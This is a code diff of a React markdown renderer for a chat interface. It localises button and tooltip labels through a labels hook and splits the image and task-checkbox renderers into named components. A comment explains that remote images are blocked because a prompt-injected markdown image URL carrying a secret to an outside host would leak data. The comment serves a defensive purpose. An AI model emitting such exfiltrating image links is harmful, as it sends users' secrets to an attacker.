@@ -5,6 +5,7 @@ import remarkGfm from 'remark-gfm';
 import { Check, Copy } from 'lucide-react';
 import { findFilePaths } from '../../../utils/fileLinks';
 import { useOpenFile } from '../../../utils/openFile';
+import { useLabels } from '../../../labels';
 import { highlight, TOKEN_CLASS } from '../../../utils/highlight';
 /**
  * Session directory file paths in the markdown resolve against. Without it (no session behind
@@ -28,7 +29,8 @@ const hastText = (node) => !node
         ? (node.value ?? '')
         : (node.children ?? []).map(hastText).join('');
 /** Copy button with a short "Copied" confirmation */
-export const CopyButton = ({ text, label = 'Copy', className = '', }) => {
+export const CopyButton = ({ text, label, className = '', }) => {
+    const t = useLabels().terminal;
     const [copied, setCopied] = useState(false);
     const timer = useRef(undefined);
     useEffect(() => () => window.clearTimeout(timer.current), []);
@@ -38,7 +40,7 @@ export const CopyButton = ({ text, label = 'Copy', className = '', }) => {
                 window.clearTimeout(timer.current);
                 timer.current = window.setTimeout(() => setCopied(false), 1500);
             }, () => setCopied(false));
-        }, className: `flex items-center gap-1 px-1.5 py-0.5 rounded text-[11px] text-gray-400 hover:text-white hover:bg-gray-800 ${focusRing} ${className}`, "aria-label": copied ? 'Copied' : label, children: [copied ? (_jsx(Check, { size: 12, "aria-hidden": true, className: "text-emerald-400" })) : (_jsx(Copy, { size: 12, "aria-hidden": true })), copied ? 'Copied' : label] }));
+        }, className: `flex items-center gap-1 px-1.5 py-0.5 rounded text-[11px] text-gray-400 hover:text-white hover:bg-gray-800 ${focusRing} ${className}`, "aria-label": copied ? t.copied : (label ?? t.copy), children: [copied ? (_jsx(Check, { size: 12, "aria-hidden": true, className: "text-emerald-400" })) : (_jsx(Copy, { size: 12, "aria-hidden": true })), copied ? t.copied : (label ?? t.copy)] }));
 };
 /** Fenced block: language label, copy button, code with syntax highlighting (utils/highlight.ts) */
 const CodeBlock = ({ node }) => {
@@ -50,7 +52,7 @@ const CodeBlock = ({ node }) => {
         ?.slice('language-'.length);
     const text = hastText(code).replace(/\n$/, '');
     const tokens = useMemo(() => highlight(text, language), [text, language]);
-    return (_jsxs("div", { className: "my-2.5 rounded-md border border-gray-800 bg-gray-950 overflow-hidden", children: [_jsxs("div", { className: "flex items-center gap-2 h-7 pl-3 pr-1 border-b border-gray-800 bg-gray-900/70", children: [_jsx("span", { className: "font-mono text-[11px] text-gray-400", children: language || 'text' }), _jsx(CopyButton, { text: text, label: "Copy", className: "ml-auto" })] }), _jsx("pre", { className: "p-3 overflow-x-auto text-xs leading-relaxed text-gray-200", children: _jsx("code", { className: `font-mono${language ? ` language-${language}` : ''}`, children: tokens.map((t, i) => t.kind ? (_jsx("span", { className: TOKEN_CLASS[t.kind], "data-token": t.kind, children: t.text }, i)) : (t.text)) }) })] }));
+    return (_jsxs("div", { className: "my-2.5 rounded-md border border-gray-800 bg-gray-950 overflow-hidden", children: [_jsxs("div", { className: "flex items-center gap-2 h-7 pl-3 pr-1 border-b border-gray-800 bg-gray-900/70", children: [_jsx("span", { className: "font-mono text-[11px] text-gray-400", children: language || 'text' }), _jsx(CopyButton, { text: text, className: "ml-auto" })] }), _jsx("pre", { className: "p-3 overflow-x-auto text-xs leading-relaxed text-gray-200", children: _jsx("code", { className: `font-mono${language ? ` language-${language}` : ''}`, children: tokens.map((t, i) => t.kind ? (_jsx("span", { className: TOKEN_CLASS[t.kind], "data-token": t.kind, children: t.text }, i)) : (t.text)) }) })] }));
 };
 /**
  * Inline code naming a file: Cmd/Ctrl-click opens it in VS Code, with Shift in its default app
@@ -59,12 +61,13 @@ const CodeBlock = ({ node }) => {
 const InlineCode = ({ children }) => {
     const cwd = useContext(ChatFileContext);
     const openFile = useOpenFile();
+    const t = useLabels().terminal;
     const text = typeof children === 'string' ? children : '';
     const match = cwd && openFile ? wholeFilePath(text) : null;
     const base = 'font-mono text-[0.85em] px-1 py-0.5 rounded bg-gray-800/80 text-pink-200';
     if (!match || !cwd || !openFile)
         return _jsx("code", { className: base, children: children });
-    return (_jsx("code", { className: `${base} cursor-pointer decoration-pink-300/40 decoration-dotted underline-offset-2 hover:underline`, title: `${MOD}-click: open in VS Code`, onClick: (e) => {
+    return (_jsx("code", { className: `${base} cursor-pointer decoration-pink-300/40 decoration-dotted underline-offset-2 hover:underline`, title: t.modClickOpen(MOD), onClick: (e) => {
             if (!(e.metaKey || e.ctrlKey))
                 return;
             e.preventDefault();
@@ -79,11 +82,12 @@ const URL_SCHEME_RE = /^[a-z][a-z0-9+.-]*:/i;
 const Link = ({ node: _node, href, children, ...rest }) => {
     const cwd = useContext(ChatFileContext);
     const openFile = useOpenFile();
+    const t = useLabels().terminal;
     const match = cwd && href && !URL_SCHEME_RE.test(href) ? wholeFilePath(decodeURI(href)) : null;
     if (match && !openFile)
         return _jsx(_Fragment, { children: children });
     if (match && cwd && openFile)
-        return (_jsx("a", { href: href, className: "text-blue-300 underline decoration-blue-300/40 hover:text-blue-200", title: `Open in VS Code (${MOD}+Shift: default app)`, onClick: (e) => {
+        return (_jsx("a", { href: href, className: "text-blue-300 underline decoration-blue-300/40 hover:text-blue-200", title: t.openInVsCodeMod(MOD), onClick: (e) => {
                 e.preventDefault();
                 void openFile(match.path, cwd, {
                     editor: !e.shiftKey,
@@ -93,22 +97,30 @@ const Link = ({ node: _node, href, children, ...rest }) => {
             }, children: children }));
     return (_jsx("a", { ...rest, href: href, className: "text-blue-300 underline decoration-blue-300/40 hover:text-blue-200", target: "_blank", rel: "noreferrer", children: children }));
 };
+/** No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data */
+const MarkdownImage = ({ alt, src, }) => {
+    const t = useLabels().terminal;
+    return (_jsx("span", { className: "text-gray-400", title: typeof src === 'string' ? src : undefined, children: t.imagePlaceholder(alt) }));
+};
+/** GFM task list boxes are read-only state */
+const TaskBox = ({ checked, type, }) => {
+    const t = useLabels().terminal;
+    return type === 'checkbox' ? (_jsx("input", { type: "checkbox", checked: !!checked, readOnly: true, disabled: true, "aria-label": checked ? t.taskDone : t.taskOpen, className: "mt-[0.3em] shrink-0 accent-blue-500" })) : null;
+};
 /** GFM rendered with Tailwind classes (no typography plugin in this app) */
 const components = {
     h1: ({ node: _n, ...p }) => (_jsx("h1", { className: "text-lg font-semibold text-gray-50 mt-5 mb-2 leading-snug", ...p })),
     h2: ({ node: _n, ...p }) => (_jsx("h2", { className: "text-base font-semibold text-gray-50 mt-5 mb-2 pb-1 border-b border-gray-800 leading-snug", ...p })),
     h3: ({ node: _n, ...p }) => (_jsx("h3", { className: "text-sm font-semibold text-gray-100 mt-4 mb-1.5", ...p })),
     h4: ({ node: _n, ...p }) => _jsx("h4", { className: "text-sm font-medium text-gray-200 mt-3 mb-1", ...p }),
-    // No remote image loads: a prompt-injected ![](https://host/?q=<secret>) would leak data
-    img: ({ alt, src }) => (_jsxs("span", { className: "text-gray-400", title: typeof src === 'string' ? src : undefined, children: ["[image", alt ? `: ${alt}` : '', "]"] })),
+    img: MarkdownImage,
     p: ({ node: _n, ...p }) => _jsx("p", { className: "my-2 leading-relaxed", ...p }),
     ul: ({ node: _n, className, ...p }) => (_jsx("ul", { className: className?.includes('contains-task-list')
             ? 'my-2 pl-1 space-y-0.5'
             : 'my-2 pl-5 list-disc space-y-0.5 marker:text-gray-500', ...p })),
     ol: ({ node: _n, ...p }) => (_jsx("ol", { className: "my-2 pl-6 list-decimal space-y-0.5 marker:text-gray-500", ...p })),
     li: ({ node: _n, className, ...p }) => (_jsx("li", { className: className?.includes('task-list-item') ? 'list-none flex items-start gap-2' : 'pl-0.5', ...p })),
-    // GFM task list boxes are read-only state
-    input: ({ node: _n, checked, type }) => type === 'checkbox' ? (_jsx("input", { type: "checkbox", checked: !!checked, readOnly: true, disabled: true, "aria-label": checked ? 'Done' : 'Open', className: "mt-[0.3em] shrink-0 accent-blue-500" })) : null,
+    input: TaskBox,
     a: Link,
     blockquote: ({ node: _n, ...p }) => (_jsx("blockquote", { className: "my-2 pl-3 border-l-2 border-gray-700 text-gray-300", ...p })),
     hr: () => _jsx("hr", { className: "my-4 border-gray-800" }),
